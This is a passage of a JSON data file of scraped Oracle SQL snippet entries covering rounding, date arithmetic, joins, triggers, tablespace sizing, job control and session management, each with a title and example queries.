    "id": 2970,
    "keyword": null,
    "link": null,
    "title": " oracle sql round",
    "description": "SELECT round(15.193, 1) AS \"Round\" FROM DUAL;       -- 15.2 SELECT round(15.193, -1) AS \"Round\" FROM DUAL;      -- 20\n",
    "reg_date": "2021-10-12T09:58:37.000Z"
  },
  {
    "id": 2971,
    "keyword": null,
    "link": null,
    "title": " oracle sql select all days between two dates except weekends",
    "description": "-- All dates between 01/07/2021 and 15/07/2021 excluding weekends SELECT CAL_DATE FROM (          SELECT to_date('01/07/2021', 'DD/MM/YYYY') + ROWNUM - 1 AS CAL_DATE          FROM ALL_OBJECTS          WHERE ROWNUM <= to_date('15/07/2021', 'DD/MM/YYYY')                               - to_date('01/07/2021', 'DD/MM/YYYY') + 1) WHERE to_char(CAL_DATE, 'DY', 'NLS_DATE_LANGUAGE=AMERICAN') NOT IN ('SAT', 'SUN');\nWHERE TO_CHAR(date_column, 'DY','NLS_DATE_LANGUAGE=AMERICAN') NOT IN ('SAT', 'SUN')\n",
    "reg_date": "2021-10-12T09:58:37.000Z"
  },
  {
    "id": 2972,
    "keyword": null,
    "link": null,
    "title": " oracle sql select case insensitive",
    "description": "",
    "reg_date": "2021-10-12T09:58:37.000Z"
  },
  {
    "id": 2973,
    "keyword": null,
    "link": null,
    "title": " oracle sql select from multiple tables",
    "description": "-- With JOIN -- No row if id does not exist in t2 SELECT t1.name, t2.salary FROM t1 JOIN t2 on t1.id = t2.id; -- A row with a NULL salary is returned if id does not exist in t2 SELECT t1.name, t2.salary FROM t1 LEFT OUTER JOIN t2 on t1.id = t2.id;  -- With UNION: distinct values SELECT emp_name AS name from employees UNION SELECT cust_name AS name from customers;  -- With UNION ALL: keeps duplicates (faster) SELECT emp_name AS name from employees UNION ALL SELECT cust_name AS name from customers;\n",
    "reg_date": "2021-10-12T09:58:37.000Z"
  },
  {
    "id": 2974,
    "keyword": null,
    "link": null,
    "title": " oracle sql select into variable",
    "description": "SELECT NAME, ADDRESS, PHONE INTO v_employee_name, v_employee_address, v_employee_phone_number FROM EMPLOYEE WHERE EMPLOYYE_ID = 6;\n",
    "reg_date": "2021-10-12T09:58:38.000Z"
  },
  {
    "id": 2975,
    "keyword": null,
    "link": null,
    "title": " oracle sql transaction",
    "description": "START TRANSACTION; SELECT @A:=SUM(salary) FROM table1 WHERE type=1; UPDATE table2 SET summary=@A WHERE type=1; COMMIT;\nSTART TRANSACTION     [transaction_characteristic [, transaction_characteristic] ...]  transaction_characteristic: {     WITH CONSISTENT SNAPSHOT   | READ WRITE   | READ ONLY }  BEGIN [WORK] COMMIT [WORK] [AND [NO] CHAIN] [[NO] RELEASE] ROLLBACK [WORK] [AND [NO] CHAIN] [[NO] RELEASE] SET autocommit = {0 | 1}\n",
    "reg_date": "2021-10-12T09:58:38.000Z"
  },
  {
    "id": 2976,
    "keyword": null,
    "link": null,
    "title": " oracle sql trigger after insert",
    "description": "-- SQL Server (update my_table2 after insert on my_table1) CREATE TRIGGER trigger_name ON my_table1 FOR INSERT AS BEGIN     UPDATE my_table2 SET my_col_date = getdate() FROM my_table1  END -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER INSERT ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\n",
    "reg_date": "2021-10-12T09:58:38.000Z"
  },
  {
    "id": 2977,
    "keyword": null,
    "link": null,
    "title": " oracle sql truncate table",
    "description": "-- Quick, no possible rollback TRUNCATE TABLE my_table; -- With rollback DELETE FROM my_table; COMMIT;\nTRUNCATE TABLE tablename\n",
    "reg_date": "2021-10-12T09:58:38.000Z"
  },
  {
    "id": 2978,
    "keyword": null,
    "link": null,
    "title": " oracle sql union tables with different columns",
    "description": "-- Add extra columns as null for the table having less columns like: SELECT COL1, COL2, COL3, COL4, COL5 FROM TABLE1 UNION SELECT COL1, COL2, COL3, NULL AS COL4, NULL AS COL5 FROM TABLE2\n",
    "reg_date": "2021-10-12T09:58:38.000Z"
  },
  {
    "id": 2979,
    "keyword": null,
    "link": null,
    "title": " oracle sql uppercase in where clause",
    "description": "UPDATE   MyTable SET   MyColumn = UPPER(MyColumn)\nSELECT upper('Hello World');\t\t-- HELLO WORLD SELECT lower('Hello World');\t\t-- hello world\nSELECT * FROM my_table WHERE upper(MY_COLUMN) = upper('My_String');\n",
    "reg_date": "2021-10-12T09:58:38.000Z"
  },
  {
    "id": 2980,
    "keyword": null,
    "link": null,
    "title": " oracle sql varchar to number",
    "description": "SELECT to_number('1') FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:38.000Z"
  },
  {
    "id": 2981,
    "keyword": null,
    "link": null,
    "title": " oracle sql wildcard like",
    "description": "SELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n",
    "reg_date": "2021-10-12T09:58:38.000Z"
  },
  {
    "id": 2982,
    "keyword": null,
    "link": null,
    "title": " oracle start job",
    "description": "BEGIN     DBMS_SCHEDULER.RUN_JOB(JOB_NAME => 'scheme.job_name',                             USE_CURRENT_SESSION => FALSE); END;\n",
    "reg_date": "2021-10-12T09:58:38.000Z"
  },
  {
    "id": 2983,
    "keyword": null,
    "link": null,
    "title": " oracle stop job",
    "description": "-- To simply stop job without killing session: BEGIN     DBMS_SCHEDULER.STOP_JOB(JOB_NAME => 'scheme.job_name', FORCE => TRUE); END; -- Killing job's session: first get Job session IDs SELECT jr.JOB, s.USERNAME, s.SID, s.SERIAL#, p.SPID, s.LOCKWAIT, s.LOGON_TIME FROM DBA_JOBS_RUNNING jr, V$SESSION s, V$PROCESS p WHERE jr.SID = s.SID AND s.PADDR = p.ADDR ORDER BY jr.JOB; -- Kill session with IDs and wait for rollback if any... ALTER SYSTEM KILL SESSION 'SID,SERIAL#' IMMEDIATE;\n",
    "reg_date": "2021-10-12T09:58:38.000Z"
  },
  {
    "id": 2984,
    "keyword": null,
    "link": null,
    "title": " oracle string length",
    "description": "-- Relevant for SQL-Oracle only  -- syntax LENGTH(<your-string>)  -- example LENGTH('CountCharacters') -- OUTPUT: 15         123456789012345  -- example with query  SELECT 'CountCharacters',LENGTH('CountCharacters') FROM DUAL;  -- OUTPUT: CountCharacters, 15 \nSELECT length('abcd') FROM DUAL;\t\t-- Oracle SELECT length('abcd');\t\t\t\t\t-- MySql / PostGreSQL SELECT len('abcd');\t\t\t\t\t\t-- SQL Server\nSELECT length('abcd') FROM DUAL;\t\t-- 4\n",
    "reg_date": "2021-10-12T09:58:39.000Z"
  },
  {
    "id": 2985,
    "keyword": null,
    "link": null,
    "title": " oracle substring",
    "description": "-- ORACLE substr(string, start, [, length ]) SELECT substr('Hello World', 4, 5) FROM DUAL;       -- lo Wo SELECT substr('Hello World', 4) FROM DUAL;          -- lo World SELECT substr('Hello World', -3) FROM DUAL;         -- rld SELECT substr('Hello World', -3, 2) FROM DUAL;      -- rl\nSUBSTR( \"20190601\", 0, 6 )\nSUBSTR( string, start_position [, length ] )\n-- For Oracle only  -- syntax  SUBSTR(<main-string>,1,<number-of-characters>)  -- example  SUBSTR('Useless stuff',1,10) -- OUTPUT: Useless st  -- practical example SELECT SUBSTR('Useless stuff',1,10) FROM DUAL;\n-- For Oracle only  -- syntax  SUBSTR(<main-string>,-<number-of-characters>)  -- example  SUBSTR('Useless stuff',-9) -- OUTPUT: ess stuff  -- practical example SELECT SUBSTR('Useless stuff',-9) FROM DUAL;\nSUBSTR(string, :START_POS, :SUBSTR_LENGTH);  SELECT SUBSTR('ABCDEFG',3,4) FROM DUAL; --OUTPUT: CDEF\n",
    "reg_date": "2021-10-12T09:58:39.000Z"
  },
  {
    "id": 2986,
    "keyword": null,
    "link": null,
    "title": " oracle swap partition",
    "description": "-- ORACLE partition swap ALTER TABLE target_table EXCHANGE PARTITION target_partition WITH TABLE source_table; /* . source_table and target_table have the same structure  \t(columns, data types, respect constraints). . indexes have to be rebuilt */\n",
    "reg_date": "2021-10-12T09:58:39.000Z"
  },
  {
    "id": 2987,
    "keyword": null,
    "link": null,
    "title": " oracle synonym",
    "description": "-- Can be a table, package, procedure... CREATE OR REPLACE SYNONYM syn_name FOR my_schema.my_table;       CREATE OR REPLACE PUBLIC SYNONYM syn_name FOR my_schema.my_table;  -- Through a dblink: CREATE OR REPLACE SYNONYM syn_name FOR my_schema.my_table@my_dblink;  SELECT * FROM DBA_SYNONYMS WHERE SYNONYM_NAME = 'synonym_name';\nCREATE OR REPLACE PUBLIC SYNONYM suppliers FOR app.suppliers;\n",
    "reg_date": "2021-10-12T09:58:39.000Z"
  },
  {
    "id": 2988,
    "keyword": null,
    "link": null,
    "title": " oracle synonym procedure",
    "description": "-- Can be a table, package, procedure... CREATE OR REPLACE SYNONYM syn_name FOR my_schema.my_procedure;       CREATE OR REPLACE PUBLIC SYNONYM syn_name FOR my_schema.my_procedure;  -- Through a dblink: CREATE OR REPLACE SYNONYM syn_name FOR my_schema.my_procedure@my_dblink;\n",
    "reg_date": "2021-10-12T09:58:39.000Z"
  },
  {
    "id": 2989,
    "keyword": null,
    "link": null,
    "title": " oracle sysdate",
    "description": "SELECT sysdate - 1 FROM dual; \t\t\t\t-- Yesterday    12/01/2021 14:27:27 SELECT trunc(sysdate) - 1 FROM dual; \t\t-- Yesterday    12/01/2021 00:00:00 SELECT sysdate + INTERVAL '20' DAY FROM DUAL;\t\t-- 20 days ahead (other way) SELECT sysdate - 1 / 24 FROM dual;\t\t\t\t\t-- 1 hour ago SELECT sysdate - 1 / 24 / 60 FROM dual;\t\t\t\t-- 1 minute ago SELECT add_months(trunc(sysdate), -1) FROM dual;   \t-- 1 month ago (no time) SELECT trunc(sysdate) - 30 FROM dual;\t\t\t\t-- 30 days ago (no time) SELECT add_months(trunc(sysdate), -12*2) FROM dual;\t-- 2 years ago (no time)  -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:58:39.000Z"
  },
  {
    "id": 2990,
    "keyword": null,
    "link": null,
    "title": " oracle sysdate - 1 month",
    "description": "SELECT sysdate - 1 FROM dual; \t\t\t\t-- Yesterday    12/01/2021 14:27:27 SELECT trunc(sysdate) - 1 FROM dual; \t\t-- Yesterday    12/01/2021 00:00:00 SELECT sysdate + INTERVAL '20' DAY FROM DUAL;\t\t-- 20 days ahead (other way) SELECT sysdate - 1 / 24 FROM dual;\t\t\t\t\t-- 1 hour ago SELECT sysdate - 1 / 24 / 60 FROM dual;\t\t\t\t-- 1 minute ago SELECT add_months(trunc(sysdate), -1) FROM dual;   \t-- 1 month ago (no time) SELECT trunc(sysdate) - 30 FROM dual;\t\t\t\t-- 30 days ago (no time) SELECT add_months(trunc(sysdate), -12*2) FROM dual;\t-- 2 years ago (no time)  -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:58:39.000Z"
  },
  {
    "id": 2991,
    "keyword": null,
    "link": null,
    "title": " oracle table comment",
    "description": "COMMENT ON TABLE table_name IS 'A table comment'; COMMENT ON COLUMN table_name.MY_COLUMN IS 'A column comment';  SELECT * FROM ALL_TAB_COMMENTS WHERE TABLE_NAME = 'TABLE_NAME'; SELECT * FROM ALL_COL_COMMENTS WHERE TABLE_NAME = 'TABLE_NAME';\nCOMMENT ON COLUMN TABLE_NAME.MY_COLUMN IS 'A column comment'; SELECT * FROM ALL_COL_COMMENTS WHERE TABLE_NAME = 'TABLE_NAME'; -- All schema columns: SELECT t.OWNER, t.TABLE_NAME, c.COLUMN_NAME, com.COMMENTS FROM DBA_TABLES t LEFT JOIN DBA_TAB_COLUMNS c     ON c.OWNER = t.OWNER AND c.TABLE_NAME = t.TABLE_NAME LEFT JOIN DBA_COL_COMMENTS com ON com.OWNER = c.OWNER AND com.TABLE_NAME = c.TABLE_NAME     AND com.COLUMN_NAME = c.COLUMN_NAME WHERE t.OWNER = 'MY_OWNER' AND t.DROPPED = 'NO' ORDER BY t.OWNER, t.TABLE_NAME, c.COLUMN_NAME;\nSELECT * FROM ALL_TAB_COMMENTS WHERE TABLE_NAME = 'MY_TABLE';  -- Table comment SELECT * FROM ALL_COL_COMMENTS WHERE TABLE_NAME = 'MY_TABLE';  -- Columns comments  -- All owner tables: SELECT t.OWNER, t.TABLE_NAME, com.COMMENTS FROM DBA_TABLES t LEFT JOIN DBA_TAB_COMMENTS com ON com.OWNER = t.OWNER AND com.TABLE_NAME = t.TABLE_NAME WHERE t.OWNER = 'TRANSFERT_DOAAT' AND t.DROPPED = 'NO' ORDER BY t.OWNER, t.TABLE_NAME;\n",
    "reg_date": "2021-10-12T09:58:39.000Z"
  },
  {
    "id": 2992,
    "keyword": null,
    "link": null,
    "title": " oracle table privileges",
    "description": "SELECT * FROM DBA_TAB_PRIVS WHERE TABLE_NAME = 'MY_TABLE';\n",
    "reg_date": "2021-10-12T09:58:39.000Z"
  },
  {
    "id": 2993,
    "keyword": null,
    "link": null,
    "title": " oracle table size",
    "description": "SELECT T1.TABLESPACE_NAME,        T1.BYTES / 1024 / 1024   as                        \"bytes_used (Mb)\",        T2.BYTES / 1024 / 1024   as                        \"bytes_free (Mb)\",        T2.largest / 1024 / 1024 as                        \"largest (Mb)\",        round(((T1.BYTES - T2.BYTES) / T1.BYTES) * 100, 2) percent_used FROM (          select TABLESPACE_NAME,                 sum(BYTES) BYTES          from dba_data_files          group by TABLESPACE_NAME      ) T1,      (          select TABLESPACE_NAME,                 sum(BYTES) BYTES,                 max(BYTES) largest          from dba_free_space          group by TABLESPACE_NAME      ) T2 where T1.TABLESPACE_NAME = T2.TABLESPACE_NAME order by ((T1.BYTES - T2.BYTES) / T1.BYTES) desc;\nSELECT e.OWNER, e.SEGMENT_NAME, e.TABLESPACE_NAME, sum(e.bytes) / 1048576 AS Megs FROM dba_extents e WHERE   e.OWNER = 'SCHEME_NAME' AND   e.TABLESPACE_NAME = 'TBS_NAME' AND   e.SEGMENT_NAME IN ('TABLE_NAME') GROUP BY e.OWNER, e.SEGMENT_NAME, e.TABLESPACE_NAME ORDER BY e.TABLESPACE_NAME, e.SEGMENT_NAME;\n",
    "reg_date": "2021-10-12T09:58:39.000Z"
  },
  {
    "id": 2994,
    "keyword": null,
    "link": null,
    "title": " oracle table statistics",
    "description": "SELECT ST.TABLE_NAME, ST.PARTITION_NAME, HIGH_VALUE, ST.NUM_ROWS,  \t   ST.BLOCKS, ST.LAST_ANALYZED FROM DBA_TAB_STATISTICS ST LEFT JOIN DBA_TAB_PARTITIONS PAR ON PAR.TABLE_NAME = ST.TABLE_NAME AND PAR.PARTITION_NAME = ST.PARTITION_NAME WHERE ST.OWNER = 'MY_OWNER'   AND ST.TABLE_NAME = 'MY_TABLE' ORDER BY PARTITION_NAME;\n",
    "reg_date": "2021-10-12T09:58:40.000Z"
  },
  {
    "id": 2995,
    "keyword": null,
    "link": null,
    "title": " oracle table statistics last analyzed",
    "description": "SELECT ST.TABLE_NAME, ST.PARTITION_NAME, HIGH_VALUE, ST.NUM_ROWS,  \t   ST.BLOCKS, ST.LAST_ANALYZED FROM DBA_TAB_STATISTICS ST LEFT JOIN DBA_TAB_PARTITIONS PAR ON PAR.TABLE_NAME = ST.TABLE_NAME AND PAR.PARTITION_NAME = ST.PARTITION_NAME WHERE ST.OWNER = 'MY_OWNER'   AND ST.TABLE_NAME = 'MY_TABLE' ORDER BY PARTITION_NAME;\n",
    "reg_date": "2021-10-12T09:58:40.000Z"
  },
  {
    "id": 2996,
    "keyword": null,
    "link": null,
    "title": " oracle tables with column name",
    "description": "SELECT * FROM USER_TAB_COLS WHERE TABLE_NAME = 'my_table'; SELECT * FROM ALL_TAB_COLS WHERE TABLE_NAME = 'my_table'; SELECT * FROM DBA_TAB_COLS WHERE TABLE_NAME = 'my_table';\nSELECT * FROM USER_TAB_COLUMNS WHERE COLUMN_NAME = 'MY_COLUMN'; -- Connected user SELECT * FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME = 'MY_COLUMN';\t-- Other schemas SELECT * FROM DBA_TAB_COLUMNS WHERE COLUMN_NAME = 'MY_COLUMN';\t-- All tables\n",
    "reg_date": "2021-10-12T09:58:40.000Z"
  },
  {
    "id": 2997,
    "keyword": null,
    "link": null,
    "title": " oracle tablespace datafile max size",
    "description": "SELECT * FROM DBA_DATA_FILES WHERE TABLESPACE_NAME = 'my_tbs' ORDER BY FILE_NAME;  ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF; -- Autoextend with max size: ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 10G AUTOEXTEND ON NEXT 1G MAXSIZE 32000M;     -- For TEMP tablespace: ALTER TABLESPACE my_tbs ADD TEMPFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF;\n",
    "reg_date": "2021-10-12T09:58:40.000Z"
  },
  {
    "id": 2998,
    "keyword": null,
    "link": null,
    "title": " oracle tablespace free space",
    "description": "SELECT T1.TABLESPACE_NAME,        T1.BYTES / 1024 / 1024   as                        \"bytes_used (Mb)\",        T2.BYTES / 1024 / 1024   as                        \"bytes_free (Mb)\",        T2.largest / 1024 / 1024 as                        \"largest (Mb)\",        round(((T1.BYTES - T2.BYTES) / T1.BYTES) * 100, 2) percent_used FROM (          select TABLESPACE_NAME,                 sum(BYTES) BYTES          from dba_data_files          group by TABLESPACE_NAME      ) T1,      (          select TABLESPACE_NAME,                 sum(BYTES) BYTES,                 max(BYTES) largest          from dba_free_space          group by TABLESPACE_NAME      ) T2 where T1.TABLESPACE_NAME = T2.TABLESPACE_NAME order by ((T1.BYTES - T2.BYTES) / T1.BYTES) desc;\n",
    "reg_date": "2021-10-12T09:58:40.000Z"
  },
  {
    "id": 2999,
    "keyword": null,
    "link": null,
    "title": " oracle tablespace size",
    "description": "SELECT T1.TABLESPACE_NAME,        T1.BYTES / 1024 / 1024   as                        \"bytes_used (Mb)\",        T2.BYTES / 1024 / 1024   as                        \"bytes_free (Mb)\",        T2.largest / 1024 / 1024 as                        \"largest (Mb)\",        round(((T1.BYTES - T2.BYTES) / T1.BYTES) * 100, 2) percent_used FROM (          select TABLESPACE_NAME,                 sum(BYTES) BYTES          from dba_data_files          group by TABLESPACE_NAME      ) T1,      (          select TABLESPACE_NAME,                 sum(BYTES) BYTES,                 max(BYTES) largest          from dba_free_space          group by TABLESPACE_NAME      ) T2 where T1.TABLESPACE_NAME = T2.TABLESPACE_NAME order by ((T1.BYTES - T2.BYTES) / T1.BYTES) desc;\nSELECT e.OWNER, e.SEGMENT_NAME, e.TABLESPACE_NAME, sum(e.bytes) / 1048576 AS Megs FROM dba_extents e WHERE   e.OWNER = 'SCHEME_NAME' AND   e.TABLESPACE_NAME = 'TBS_NAME' AND   e.SEGMENT_NAME IN ('TABLE_NAME') GROUP BY e.OWNER, e.SEGMENT_NAME, e.TABLESPACE_NAME ORDER BY e.TABLESPACE_NAME, e.SEGMENT_NAME;\n    ALTER TABLESPACE tablespace_name     ADD DATAFILE 'path_to_datafile'     SIZE size     AUTOEXTEND ON; Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:58:40.000Z"
  },
  {
    "id": 3000,
    "keyword": null,
    "link": null,
    "title": " oracle tablespace tables list",
    "description": "SELECT * FROM USER_TABLES;\t\t-- Tables from connected schema SELECT * FROM ALL_TABLES;\t\t-- Tables available to connected schema \tSELECT * FROM ALL_TABLES WHERE OWNER = 'SCHEMA_NAME'; \tSELECT * FROM ALL_TABLES WHERE TABLES_NAME = 'TABLE_NAME'; SELECT * FROM DBA_TABLES;\t\t-- All Tables\nSELECT e.OWNER, e.SEGMENT_NAME, e.TABLESPACE_NAME, sum(e.bytes) / 1048576 AS Megs FROM dba_extents e WHERE   e.OWNER = 'MY_USER' AND   e.TABLESPACE_NAME = 'MY_TABLESPACE' GROUP BY e.OWNER, e.SEGMENT_NAME, e.TABLESPACE_NAME ORDER BY e.TABLESPACE_NAME, e.SEGMENT_NAME;\nCREATE TABLESPACE TBS_NOME_TABLESPACE DATAFILE 'NOME_DATAFILE.dbf' SIZE 40M ONLINE;\nCREATE TABLE TB_NOME_TABELA ( CODIGO NUMBER(38) )TABLESPACE TBS_NOME_TABLESPACE;\n",
    "reg_date": "2021-10-12T09:58:40.000Z"
  },
  {
    "id": 3001,
    "keyword": null,
    "link": null,
    "title": " oracle tablespace usage",
    "description": "SELECT T1.TABLESPACE_NAME,        T1.BYTES / 1024 / 1024   as                        \"bytes_used (Mb)\",        T2.BYTES / 1024 / 1024   as                        \"bytes_free (Mb)\",        T2.largest / 1024 / 1024 as                        \"largest (Mb)\",        round(((T1.BYTES - T2.BYTES) / T1.BYTES) * 100, 2) percent_used FROM (          select TABLESPACE_NAME,                 sum(BYTES) BYTES          from dba_data_files          group by TABLESPACE_NAME      ) T1,      (          select TABLESPACE_NAME,                 sum(BYTES) BYTES,                 max(BYTES) largest          from dba_free_space          group by TABLESPACE_NAME      ) T2 where T1.TABLESPACE_NAME = T2.TABLESPACE_NAME order by ((T1.BYTES - T2.BYTES) / T1.BYTES) desc;\n-- Size and usage of tablespaces SELECT T1.TABLESPACE_NAME,        T1.BYTES / 1024 / 1024   as                        \"bytes_used (Mb)\",        T2.BYTES / 1024 / 1024   as                        \"bytes_free (Mb)\",        T2.largest / 1024 / 1024 as                        \"largest (Mb)\",        round(((T1.BYTES - T2.BYTES) / T1.BYTES) * 100, 2) percent_used FROM (          select TABLESPACE_NAME,                 sum(BYTES) BYTES          from dba_data_files          group by TABLESPACE_NAME      ) T1,      (          select TABLESPACE_NAME,                 sum(BYTES) BYTES,                 max(BYTES) largest          from dba_free_space          group by TABLESPACE_NAME      ) T2 where T1.TABLESPACE_NAME = T2.TABLESPACE_NAME order by ((T1.BYTES - T2.BYTES) / T1.BYTES) desc;\nCREATE TABLESPACE TBS_NOME_TABLESPACE DATAFILE 'NOME_DATAFILE.dbf' SIZE 40M ONLINE;\nCREATE TABLE TB_NOME_TABELA ( CODIGO NUMBER(38) )TABLESPACE TBS_NOME_TABLESPACE;\n",
    "reg_date": "2021-10-12T09:58:40.000Z"
  },
  {
    "id": 3002,
    "keyword": null,
    "link": null,
    "title": " oracle timestamp to date",
    "description": "-- TO_TIMESTAMP(date_string,'YYYY-MM-DD HH24:MI:SS') SELECT TO_TIMESTAMP('2021-02-21 23:12:01','YYYY-MM-DD HH24:MI:SS') FROM DUAL;\nCAST(timestamp_expression AS DATE)\n",
    "reg_date": "2021-10-12T09:58:40.000Z"
  },
  {
    "id": 3003,
    "keyword": null,
    "link": null,
    "title": " oracle to char number format percentage",
    "description": "-- Formatted SELECT decimal_column * 100 || '%' AS percentage FROM table_name; -- Rounded SELECT round(decimal_column * 100, 2) || '%' AS percentage FROM table_name; -- Value SELECT decimal_column * 100 AS percentage FROM table_name; SELECT TO_CHAR(decimal_column,'fm990D00','NLS_NUMERIC_CHARACTERS = ''.,''')  \tFROM dual;\n",
    "reg_date": "2021-10-12T09:58:40.000Z"
  },
  {
    "id": 3004,
    "keyword": null,
    "link": null,
    "title": " oracle to date",
    "description": "-- TO_TIMESTAMP(date_string,'YYYY-MM-DD HH24:MI:SS') SELECT TO_TIMESTAMP('2021-02-21 23:12:01','YYYY-MM-DD HH24:MI:SS') FROM DUAL;\nSELECT   TO_DATE( '5 Jan 2017', 'DD MON YYYY' ) FROM   dual;  ---or---- INSERT INTO members(first_name, last_name, joined_date) VALUES('Laureen','Davidson', TO_DATE('Feb 01 2017','Mon DD YYYY'));\nSELECT TO_DATE('14/07/2021','DD/MM/YYYY') FROM DUAL;                                    WATCH OUT!  /*\t  in the example before if you write '14072021' instead of '14/07/2021'       you'll get the same result, if you want an exception to be thrown you           should add the prefix 'fx' (force) to the format, so that he will        match only the exact format. here's some examples:          SELECT TO_DATE('14/07/2021','fxDD/MM/YYYY') FROM DUAL;--WORKS          SELECT TO_DATE('14072021','DD/MM/YYYY') FROM DUAL;    --WORKS          SELECT TO_DATE('14072021','fxDD/MM/YYYY') FROM DUAL;--EXCEPTION      */\n",
    "reg_date": "2021-10-12T09:58:40.000Z"
  },
  {
    "id": 3005,
    "keyword": null,
    "link": null,
    "title": " oracle to number",
    "description": "TO_NUMBER('1210.73', '9999.99') Result: 1210.73  TO_NUMBER('546', '999') Result: 546  TO_NUMBER('23', '99') Result: 23\nTO_NUMBER( string1 [, format_mask] [, nls_language] )\n",
    "reg_date": "2021-10-12T09:58:40.000Z"
  },
  {
    "id": 3006,
    "keyword": null,
    "link": null,
    "title": " oracle to timestamp",
    "description": "-- TO_TIMESTAMP(date_string,'YYYY-MM-DD HH24:MI:SS') SELECT TO_TIMESTAMP('2021-02-21 23:12:01','YYYY-MM-DD HH24:MI:SS') FROM DUAL;\nCAST(timestamp_expression AS DATE)\n",
    "reg_date": "2021-10-12T09:58:41.000Z"
  },
  {
    "id": 3007,
    "keyword": null,
    "link": null,
    "title": " oracle trace file",
    "description": "SELECT s.SID,        s.SERIAL#,        pa.VALUE || '/' || lower(sys_context('userenv', 'instance_name')) ||        '_ora_' || p.SPID || '.trc' AS TRACE_FILE FROM V$SESSION s, V$PROCESS p, V$paRAMETER pa WHERE pa.NAME = 'user_dump_dest'   AND s.paDDR = p.ADDR   AND s.AUDSID = sys_context('USERENV', 'SESSIONID');\n",
    "reg_date": "2021-10-12T09:58:41.000Z"
  },
  {
    "id": 3008,
    "keyword": null,
    "link": null,
    "title": " oracle trace session",
    "description": "SELECT s.SID,        s.SERIAL#,        pa.VALUE || '/' || lower(sys_context('userenv', 'instance_name')) ||        '_ora_' || p.SPID || '.trc' AS TRACE_FILE FROM V$SESSION s, V$PROCESS p, V$paRAMETER pa WHERE pa.NAME = 'user_dump_dest'   AND s.paDDR = p.ADDR   AND s.AUDSID = sys_context('USERENV', 'SESSIONID');\n",
    "reg_date": "2021-10-12T09:58:41.000Z"
  },
  {
    "id": 3009,
    "keyword": null,
    "link": null,
    "title": " oracle transaction commit rollback example",
    "description": "-- Rollback (cancellation) DELETE FROM employees WHERE employee_id = 123;    -- Done in current session ROLLBACK;                                         -- Cancelled in current session SELECT * FROM employees WHERE employee_id = 123;  -- Found -- Commit (validation) DELETE FROM employees WHERE employee_id = 123;    -- Done in current session COMMIT;                                           -- Visible for ALL sessions SELECT * FROM employees WHERE employee_id = 123;  -- Missing for ALL sessions\n",
    "reg_date": "2021-10-12T09:58:41.000Z"
  },
  {
    "id": 3010,
    "keyword": null,
    "link": null,
    "title": " oracle trigger",
    "description": "CREATE [OR REPLACE ] TRIGGER trigger_name   {BEFORE | AFTER | INSTEAD OF }   {INSERT [OR] | UPDATE [OR] | DELETE}   [OF col_name]   ON table_name   [REFERENCING OLD AS o NEW AS n]   [FOR EACH ROW]   WHEN (condition)    DECLARE     Declaration-statements  BEGIN      Executable-statements  EXCEPTION     Exception-handling-statements  END; \nCREATE OR REPLACE TRIGGER my_schema.trigger_name AFTER LOGON ON DATABASE BEGIN     INSERT INTO my_log_table     VALUES (USER AS CONNECTED_USER,         sys_context('USERENV', 'SESSIONID') AS SESSION_ID,         substr(sys_context('USERENV', 'OS_USER'), 1, 50) AS OS_USER,         substr(sys_context('USERENV', 'HOST'), 1, 30) AS HOST,         SYSDATE AS LOGON_DATE); END; ALTER TRIGGER my_schema.trigger_name ENABLE;\n",
    "reg_date": "2021-10-12T09:58:41.000Z"
  },
  {
    "id": 3011,
    "keyword": null,
    "link": null,
    "title": " oracle trigger after connect",
    "description": "CREATE OR REPLACE TRIGGER my_schema.trigger_name AFTER LOGON ON DATABASE BEGIN     INSERT INTO my_log_table     VALUES (USER AS CONNECTED_USER,         sys_context('USERENV', 'SESSIONID') AS SESSION_ID,         substr(sys_context('USERENV', 'OS_USER'), 1, 50) AS OS_USER,         substr(sys_context('USERENV', 'HOST'), 1, 30) AS HOST,         SYSDATE AS LOGON_DATE); END; ALTER TRIGGER my_schema.trigger_name ENABLE;\n",
    "reg_date": "2021-10-12T09:58:41.000Z"
  },
  {
    "id": 3012,
    "keyword": null,
    "link": null,
    "title": " oracle trigger after logon on database",
    "description": "CREATE OR REPLACE TRIGGER my_schema.trigger_name AFTER LOGON ON DATABASE BEGIN     INSERT INTO my_log_table     VALUES (USER AS CONNECTED_USER,         sys_context('USERENV', 'SESSIONID') AS SESSION_ID,         substr(sys_context('USERENV', 'OS_USER'), 1, 50) AS OS_USER,         substr(sys_context('USERENV', 'HOST'), 1, 30) AS HOST,         SYSDATE AS LOGON_DATE); END; ALTER TRIGGER my_schema.trigger_name ENABLE;\n",
    "reg_date": "2021-10-12T09:58:41.000Z"
  },
  {
    "id": 3013,
    "keyword": null,
    "link": null,
    "title": " oracle trigger after logon on schema",
    "description": "CREATE OR REPLACE TRIGGER my_schema.trigger_name AFTER LOGON ON DATABASE BEGIN     INSERT INTO my_log_table     VALUES (USER AS CONNECTED_USER,         sys_context('USERENV', 'SESSIONID') AS SESSION_ID,         substr(sys_context('USERENV', 'OS_USER'), 1, 50) AS OS_USER,         substr(sys_context('USERENV', 'HOST'), 1, 30) AS HOST,         SYSDATE AS LOGON_DATE); END; ALTER TRIGGER my_schema.trigger_name ENABLE;\n",
    "reg_date": "2021-10-12T09:58:41.000Z"
  },
  {
    "id": 3014,
    "keyword": null,
    "link": null,
